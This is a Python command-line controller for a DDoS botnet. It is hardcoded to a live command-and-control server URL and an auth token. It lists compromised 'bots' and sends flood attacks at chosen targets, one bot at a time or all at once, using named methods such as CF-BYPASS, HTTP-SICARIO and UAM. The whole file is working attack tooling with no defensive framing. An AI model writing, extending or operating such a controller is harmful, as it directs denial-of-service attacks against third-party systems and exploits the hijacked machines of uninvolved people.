#!/usr/bin/env python3

import os
import sys
import json
import time
import argparse
import subprocess
import signal
import threading
from datetime import datetime
from typing import Dict, List, Optional
import urllib3

try:
    import requests
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    print("Installing required packages...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])
    import requests
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== COLORS ==========
class Colors:
    def __init__(self):
        self.RED = Fore.RED
        self.GREEN = Fore.GREEN
        self.YELLOW = Fore.YELLOW
        self.BLUE = Fore.BLUE
        self.MAGENTA = Fore.MAGENTA
        self.CYAN = Fore.CYAN
        self.WHITE = Fore.WHITE
        self.RED_BRIGHT = getattr(Fore, 'RED_BRIGHT', Fore.RED)
        self.GREEN_BRIGHT = getattr(Fore, 'GREEN_BRIGHT', Fore.GREEN)
        self.YELLOW_BRIGHT = getattr(Fore, 'YELLOW_BRIGHT', Fore.YELLOW)
        self.BLUE_BRIGHT = getattr(Fore, 'BLUE_BRIGHT', Fore.BLUE)
        self.MAGENTA_BRIGHT = getattr(Fore, 'MAGENTA_BRIGHT', Fore.MAGENTA)
        self.CYAN_BRIGHT = getattr(Fore, 'CYAN_BRIGHT', Fore.CYAN)
        self.WHITE_BRIGHT = getattr(Fore, 'WHITE_BRIGHT', Fore.WHITE)
        self.GRAY = getattr(Fore, 'LIGHTBLACK_EX', Fore.WHITE)
        self.RESET = Style.RESET_ALL

C = Colors()

# ========== CONFIG ==========
DEFAULT_SERVER = "https://hello-kutty-k7d3.onrender.com"
DEFAULT_TOKEN = "ricardo"
CONFIG_FILE = "c2_cli_config.json"

# ========== C2 CONTROLLER ==========
class C2CLIController:
    def __init__(self, server_url: str = DEFAULT_SERVER, token: str = DEFAULT_TOKEN):
        self.server_url = server_url.rstrip('/')
        self.token = token
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'Authorization': token})
        
        self.stats = {}
        self.bots = []
        self.running = True
        self.auto_refresh = False
        self.refresh_thread = None
        
        self.load_config()
        self.test_connection()
        signal.signal(signal.SIGINT, self.shutdown)
        signal.signal(signal.SIGTERM, self.shutdown)
    
    def load_config(self):
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    self.server_url = config.get('server_url', self.server_url)
                    self.token = config.get('token', self.token)
                    self.session.headers.update({'Authorization': self.token})
            except:
                pass
    
    def save_config(self):
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump({
                    'server_url': self.server_url,
                    'token': self.token
                }, f, indent=2)
        except:
            pass
    
    def test_connection(self):
        try:
            response = self.session.get(f"{self.server_url}/ping", timeout=5)
            if response.status_code == 200:
                data = response.json()
                print(f"{C.GREEN}✅ Connected to server: {self.server_url}{C.RESET}")
                print(f"{C.GREEN}   Bots: {data.get('bots', 0)} | Uptime: {data.get('uptime', 0):.0f}s{C.RESET}")
                return True
            else:
                print(f"{C.RED}❌ Server returned status: {response.status_code}{C.RESET}")
                return False
        except Exception as e:
            print(f"{C.RED}❌ Failed to connect to server: {e}{C.RESET}")
            return False
    
    def get_bots(self) -> List[Dict]:
        try:
            response = self.session.get(f"{self.server_url}/bots", timeout=10)
            if response.status_code == 200:
                data = response.json()
                self.bots = data.get('bots', [])
                return self.bots
        except Exception as e:
            print(f"{C.RED}❌ Failed to fetch bots: {e}{C.RESET}")
        return []
    
    def get_stats(self) -> Dict:
        try:
            response = self.session.get(f"{self.server_url}/api/stats", timeout=10)
            if response.status_code == 200:
                self.stats = response.json()
                return self.stats
        except Exception as e:
            print(f"{C.RED}❌ Failed to fetch stats: {e}{C.RESET}")
        return {}
    
    def attack_bot(self, bot_id: str, target: str, time_sec: int, method: str) -> bool:
        try:
            params = {
                'bot': bot_id,
                'target': target,
                'time': str(time_sec),
                'methods': method
            }
            response = self.session.get(f"{self.server_url}/attack-bot", params=params, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get('success', False)
            return False
        except Exception as e:
            print(f"{C.RED}❌ Failed to send attack: {e}{C.RESET}")
            return False
    
    def attack_all_bots(self, target: str, time_sec: int, method: str) -> Dict:
        try:
            params = {
                'target': target,
                'time': str(time_sec),
                'methods': method
            }
            response = self.session.get(f"{self.server_url}/attack-all", params=params, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return {
                    'success': data.get('success', False),
                    'message': data.get('message', ''),
                    'sent': data.get('sent', 0)
                }
            return {'success': False, 'message': f'HTTP {response.status_code}', 'sent': 0}
        except Exception as e:
            return {'success': False, 'message': str(e), 'sent': 0}
    
    def stop_all(self) -> bool:
        try:
            response = self.session.get(f"{self.server_url}/stop-all", timeout=10)
            return response.status_code == 200 and response.json().get('success', False)
        except Exception as e:
            print(f"{C.RED}❌ Failed to stop all: {e}{C.RESET}")
            return False
    
    def server_attack(self, target: str, time_sec: int, method: str) -> bool:
        try:
            params = {
                'target': target,
                'time': str(time_sec),
                'methods': method
            }
            response = self.session.get(f"{self.server_url}/attack", params=params, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"{C.RED}❌ Failed to launch server attack: {e}{C.RESET}")
            return False
    
    def block_bot(self, bot_id: str) -> bool:
        try:
            params = {'bot': bot_id}
            response = self.session.get(f"{self.server_url}/block-bot", params=params, timeout=10)
            return response.status_code == 200 and response.json().get('success', False)
        except Exception as e:
            print(f"{C.RED}❌ Failed to block bot: {e}{C.RESET}")
            return False
    
    def unblock_bot(self, bot_id: str) -> bool:
        try:
            params = {'bot': bot_id}
            response = self.session.get(f"{self.server_url}/unblock-bot", params=params, timeout=10)
            return response.status_code == 200 and response.json().get('success', False)
        except Exception as e:
            print(f"{C.RED}❌ Failed to unblock bot: {e}{C.RESET}")
            return False
    
    def remove_bot(self, bot_id: str) -> bool:
        try:
            params = {'bot': bot_id}
            response = self.session.get(f"{self.server_url}/remove-bot", params=params, timeout=10)
            return response.status_code == 200 and response.json().get('success', False)
        except Exception as e:
            print(f"{C.RED}❌ Failed to remove bot: {e}{C.RESET}")
            return False
    
    def get_blocked(self) -> List[str]:
        try:
            response = self.session.get(f"{self.server_url}/blocked", timeout=10)
            if response.status_code == 200:
                return response.json().get('blocked', [])
        except Exception as e:
            print(f"{C.RED}❌ Failed to get blocked list: {e}{C.RESET}")
        return []
    
    def get_methods(self) -> List[str]:
        try:
            response = self.session.get(f"{self.server_url}/methods", timeout=10)
            if response.status_code == 200:
                return response.json().get('methods', [])
        except Exception as e:
            print(f"{C.RED}❌ Failed to get methods: {e}{C.RESET}")
        return []
    
    # ========== DISPLAY ==========
    def clear_screen(self):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
        except:
            print('\n' * 100)
    
    def print_header(self):
        self.clear_screen()
        print(f"{C.CYAN}{'='*70}{C.RESET}")
        print(f"{C.CYAN_BRIGHT}🎯 C2 CONTROLLER - BOTNET COMMAND CENTER{C.RESET}")
        print(f"{C.CYAN}{'='*70}{C.RESET}")
        print(f"{C.MAGENTA}📡 Server: {self.server_url}{C.RESET}")
        print(f"{C.MAGENTA}🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{C.RESET}")
        print(f"{C.CYAN}{'='*70}{C.RESET}\n")
    
    def print_bots(self):
        bots = self.get_bots()
        if not bots:
            print(f"{C.YELLOW}⚠️ No bots connected{C.RESET}\n")
            return
        
        print(f"{C.GREEN}📊 Connected Bots: {len(bots)}{C.RESET}")
        print(f"{C.CYAN}{'-'*70}{C.RESET}")
        print(f"{'ID':<25} {'Name':<15} {'Status':<12} {'Attacks':<10}")
        print(f"{C.CYAN}{'-'*70}{C.RESET}")
        
        now = time.time()
        for bot in bots:
            bot_id = bot.get('id', 'Unknown')[:24]
            name = bot.get('name', 'Unknown')[:14]
            online = bot.get('online', False)
            attacking = bot.get('attacking', False)
            attacks = bot.get('attacksPerformed', 0)
            
            status = f"{C.GREEN}● Online{C.RESET}" if online else f"{C.RED}● Offline{C.RESET}"
            attack_status = f"{C.RED}🔥 YES{C.RESET}" if attacking else f"{C.GRAY}❌ NO{C.RESET}"
            
            print(f"{bot_id:<25} {name:<15} {status} {attack_status:<12} {attacks:<10}")
        
        print(f"{C.CYAN}{'-'*70}{C.RESET}\n")
    
    def print_stats(self):
        stats = self.get_stats()
        if not stats:
            return
        
        print(f"{C.CYAN}📊 SERVER STATISTICS{C.RESET}")
        print(f"{C.CYAN}{'-'*70}{C.RESET}")
        print(f"{C.WHITE}Total Bots: {stats.get('totalBots', 0)}")
        print(f"{C.GREEN}Online Bots: {stats.get('onlineBots', 0)}")
        print(f"{C.RED}Offline Bots: {stats.get('offlineBots', 0)}")
        print(f"{C.YELLOW}Active Attacks: {stats.get('activeAttacks', 0)}")
        print(f"{C.MAGENTA}Total Attacks: {stats.get('totalAttacks', 0)}")
        print(f"{C.CYAN}Total Requests: {stats.get('totalRequests', 0)}")
        print(f"{C.BLUE}Uptime: {stats.get('uptime', 0):.0f}s")
        print(f"{C.CYAN}{'-'*70}{C.RESET}\n")
    
    def print_methods(self):
        methods = self.get_methods()
        if not methods:
            methods = [
                'CF-BYPASS', 'MODERN-FLOOD', 'HTTP-SICARIO', 'RAW-HTTP', 'RAW-GET',
                'R9', 'PRIV-TOR', 'HOLD-PANEL', 'R1', 'UAM', 'W.I.L', 'BYPASS', 
                'VHOLD', 'W-FLOOD', 'STRESS', 'CURL-SPAM', 'RAPID10', 'R10'
            ]
        
        print(f"{C.CYAN}📚 AVAILABLE METHODS{C.RESET}")
        print(f"{C.CYAN}{'-'*70}{C.RESET}")
        cols = 4
        for i in range(0, len(methods), cols):
            row = methods[i:i+cols]
            formatted = []
            for m in row:
                formatted.append(f"{C.GREEN}{m:<18}{C.RESET}")
            print(''.join(formatted))
        print(f"{C.CYAN}{'-'*70}{C.RESET}\n")
    
    def print_help(self):
        print(f"{C.CYAN}📚 COMMANDS{C.RESET}")
        print(f"{C.CYAN}{'-'*70}{C.RESET}")
        print(f"{C.GREEN}bots{C.RESET}                              - List all bots")
        print(f"{C.GREEN}stats{C.RESET}                             - Show statistics")
        print(f"{C.GREEN}methods{C.RESET}                           - List available methods")
        print(f"{C.GREEN}attack <bot_id> <target> <time> <method>{C.RESET} - Attack specific bot")
        print(f"{C.GREEN}attack-all <target> <time> <method>{C.RESET}     - Attack ALL bots")
        print(f"{C.GREEN}server-attack <target> <time> <method>{C.RESET}   - Attack from server")
        print(f"{C.GREEN}stop-all{C.RESET}                         - Stop all attacks")
        print(f"{C.GREEN}block <bot_id>{C.RESET}                   - Block a bot")
        print(f"{C.GREEN}unblock <bot_id>{C.RESET}                 - Unblock a bot")
        print(f"{C.GREEN}remove <bot_id>{C.RESET}                  - Remove a bot")
        print(f"{C.GREEN}blocked{C.RESET}                          - List blocked bots")
        print(f"{C.GREEN}refresh{C.RESET}                          - Refresh data")
        print(f"{C.GREEN}autorefresh{C.RESET}                      - Toggle auto-refresh")
        print(f"{C.GREEN}clear{C.RESET}                            - Clear screen")
        print(f"{C.GREEN}help{C.RESET}                             - Show this help")
        print(f"{C.GREEN}exit{C.RESET}                             - Exit")
        print(f"{C.CYAN}{'-'*70}{C.RESET}\n")
    
    # ========== AUTO-REFRESH ==========
    def toggle_autorefresh(self):
        self.auto_refresh = not self.auto_refresh
        if self.auto_refresh:
            print(f"{C.GREEN}🔄 Auto-refresh enabled (every 5 seconds){C.RESET}")
            if self.refresh_thread is None or not self.refresh_thread.is_alive():
                self.refresh_thread = threading.Thread(target=self.auto_refresh_loop, daemon=True)
                self.refresh_thread.start()
        else:
            print(f"{C.YELLOW}⏸️ Auto-refresh disabled{C.RESET}")
    
    def auto_refresh_loop(self):
        while self.running and self.auto_refresh:
            try:
                self.clear_screen()
                self.print_header()
                self.print_bots()
                self.print_stats()
                self.print_help()
                print(f"{C.GRAY}💡 Auto-refresh enabled (updates every 5s){C.RESET}")
                time.sleep(5)
            except:
                time.sleep(5)
    
    # ========== COMMAND HANDLERS ==========
    def handle_attack(self, args: List[str]):
        if len(args) < 4:
            print(f"{C.RED}❌ Usage: attack <bot_id> <target> <time> <method>{C.RESET}")
            return
        
        bot_id = args[0]
        target = args[1]
        try:
            time_sec = int(args[2])
        except:
            print(f"{C.RED}❌ Invalid time{C.RESET}")
            return
        method = args[3]
        
        print(f"{C.YELLOW}🎯 Sending attack command...{C.RESET}")
        if self.attack_bot(bot_id, target, time_sec, method):
            print(f"{C.GREEN}✅ Attack sent to {bot_id}{C.RESET}")
        else:
            print(f"{C.RED}❌ Failed to send attack{C.RESET}")
    
    def handle_attack_all(self, args: List[str]):
        if len(args) < 3:
            print(f"{C.RED}❌ Usage: attack-all <target> <time> <method>{C.RESET}")
            return
        
        target = args[0]
        try:
            time_sec = int(args[1])
        except:
            print(f"{C.RED}❌ Invalid time{C.RESET}")
            return
        method = args[2]
        
        print(f"{C.YELLOW}🎯 Sending attack to ALL bots...{C.RESET}")
        result = self.attack_all_bots(target, time_sec, method)
        
        if result.get('success'):
            print(f"{C.GREEN}✅ {result.get('message', 'Attack sent')}{C.RESET}")
            if result.get('sent', 0) > 0:
                print(f"{C.CYAN}📊 Sent to {result.get('sent')} bots{C.RESET}")
        else:
            print(f"{C.RED}❌ Failed: {result.get('message', 'Unknown error')}{C.RESET}")
    
    def handle_server_attack(self, args: List[str]):
        if len(args) < 3:
            print(f"{C.RED}❌ Usage: server-attack <target> <time> <method>{C.RESET}")
            return
        
        target = args[0]
        try:
            time_sec = int(args[1])
        except:
            print(f"{C.RED}❌ Invalid time{C.RESET}")
            return
        method = args[2]
        
        print(f"{C.YELLOW}🎯 Launching server attack...{C.RESET}")
        if self.server_attack(target, time_sec, method):
            print(f"{C.GREEN}✅ Server attack launched{C.RESET}")
        else:
            print(f"{C.RED}❌ Failed to launch attack{C.RESET}")
    
    def handle_stop_all(self):
        if self.stop_all():
            print(f"{C.GREEN}✅ Stop-all command sent to server{C.RESET}")
        else:
            print(f"{C.RED}❌ Failed to stop all{C.RESET}")
    
    def handle_block(self, args: List[str]):
        if not args:
            print(f"{C.RED}❌ Usage: block <bot_id>{C.RESET}")
            return
        bot_id = args[0]
        if self.block_bot(bot_id):
            print(f"{C.GREEN}✅ Bot blocked: {bot_id}{C.RESET}")
        else:
            print(f"{C.RED}❌ Failed to block bot{C.RESET}")
    
    def handle_unblock(self, args: List[str]):
        if not args:
            print(f"{C.RED}❌ Usage: unblock <bot_id>{C.RESET}")
            return
        bot_id = args[0]
        if self.unblock_bot(bot_id):
            print(f"{C.GREEN}✅ Bot unblocked: {bot_id}{C.RESET}")
        else:
            print(f"{C.RED}❌ Failed to unblock bot{C.RESET}")
    
    def handle_remove(self, args: List[str]):
        if not args:
            print(f"{C.RED}❌ Usage: remove <bot_id>{C.RESET}")
            return
        bot_id = args[0]
        if self.remove_bot(bot_id):
            print(f"{C.GREEN}✅ Bot removed: {bot_id}{C.RESET}")
        else:
            print(f"{C.RED}❌ Failed to remove bot{C.RESET}")
    
    def handle_blocked(self):
        blocked = self.get_blocked()
        if blocked:
            print(f"{C.YELLOW}🚫 Blocked bots:{C.RESET}")
            for bot_id in blocked:
                print(f"  {C.RED}• {bot_id}{C.RESET}")
        else:
            print(f"{C.GREEN}✅ No blocked bots{C.RESET}")
        print()
    
    def handle_refresh(self):
        self.clear_screen()
        self.print_header()
        self.print_bots()
        self.print_stats()
        self.print_help()
        print(f"{C.GRAY}💡 Data refreshed.{C.RESET}")
    
    def handle_clear(self):
        self.clear_screen()
        self.print_header()
        self.print_bots()
        self.print_stats()
        self.print_help()
    
    # ========== MAIN LOOP ==========
    def run(self):
        self.clear_screen()
        self.print_header()
        self.print_bots()
        self.print_stats()
        self.print_help()
        print(f"{C.GRAY}💡 Connected to {self.server_url}{C.RESET}")
        print(f"{C.GRAY}💡 Type 'help' for commands | 'autorefresh' for auto-updates{C.RESET}\n")
        
        while self.running:
            try:
                cmd_input = input(f"{C.CYAN}┌─({C.GREEN}C2{C.CYAN})─({C.YELLOW}{self.server_url[:30]}...{C.CYAN})\n└──╼ {C.RESET}").strip()
                
                if not cmd_input:
                    continue
                
                parts = cmd_input.split()
                command = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                if command == 'bots' or command == 'list':
                    self.handle_refresh()
                elif command == 'stats':
                    self.clear_screen()
                    self.print_header()
                    self.print_stats()
                    self.print_help()
                elif command == 'methods':
                    self.clear_screen()
                    self.print_header()
                    self.print_methods()
                    self.print_help()
                elif command == 'attack':
                    self.handle_attack(args)
                elif command == 'attack-all':
                    self.handle_attack_all(args)
                elif command == 'server-attack':
                    self.handle_server_attack(args)
                elif command == 'stop-all':
                    self.handle_stop_all()
                elif command == 'block':
                    self.handle_block(args)
                elif command == 'unblock':
                    self.handle_unblock(args)
                elif command == 'remove':
                    self.handle_remove(args)
                elif command == 'blocked':
                    self.handle_blocked()
                elif command == 'refresh':
                    self.handle_refresh()
                elif command == 'autorefresh':
                    self.toggle_autorefresh()
                elif command == 'clear':
                    self.handle_clear()
                elif command == 'help':
                    self.print_help()
                elif command == 'exit' or command == 'quit':
                    self.shutdown()
                    break
                else:
                    print(f"{C.RED}❌ Unknown command. Type 'help' for available commands.{C.RESET}")
                
            except KeyboardInterrupt:
                self.shutdown()
                break
            except Exception as e:
                print(f"{C.RED}❌ Error: {e}{C.RESET}")
    
    def shutdown(self, signum=None, frame=None):
        if not self.running:
            return
        print(f"\n{C.YELLOW}🛑 Shutting down C2 controller...{C.RESET}")
        self.running = False
        self.auto_refresh = False
        self.save_config()
        print(f"{C.GREEN}✅ Goodbye!{C.RESET}")
        sys.exit(0)

# ========== MAIN ==========
def main():
    parser = argparse.ArgumentParser(description='C2 CLI Controller')
    parser.add_argument('--server', '-s', default=DEFAULT_SERVER, help='C2 server URL')
    parser.add_argument('--token', '-t', default=DEFAULT_TOKEN, help='Auth token')
    parser.add_argument('--command', '-c', type=str, help='Execute single command')
    parser.add_argument('--attack-all', '-a', nargs=3, metavar=('TARGET', 'TIME', 'METHOD'), help='Attack all bots')
    
    args = parser.parse_args()
    controller = C2CLIController(args.server, args.token)
    
    if args.command:
        parts = args.command.split()
        cmd = parts[0].lower()
        cmd_args = parts[1:] if len(parts) > 1 else []
        
        if cmd == 'bots':
            controller.get_bots()
            controller.print_bots()
        elif cmd == 'stats':
            controller.get_stats()
            controller.print_stats()
        elif cmd == 'methods':
            controller.print_methods()
        elif cmd == 'blocked':
            controller.handle_blocked()
        elif cmd == 'stop-all':
            controller.handle_stop_all()
        elif cmd == 'attack-all' and len(cmd_args) >= 3:
            controller.handle_attack_all(cmd_args)
        else:
            print(f"{C.RED}❌ Unknown command: {cmd}{C.RESET}")
        return
    
    if args.attack_all:
        target, time_sec, method = args.attack_all
        try:
            time_sec = int(time_sec)
            controller.attack_all_bots(target, time_sec, method)
        except ValueError:
            print(f"{C.RED}❌ Invalid time{C.RESET}")
        return
    
    controller.run()

if __name__ == "__main__":
    main()
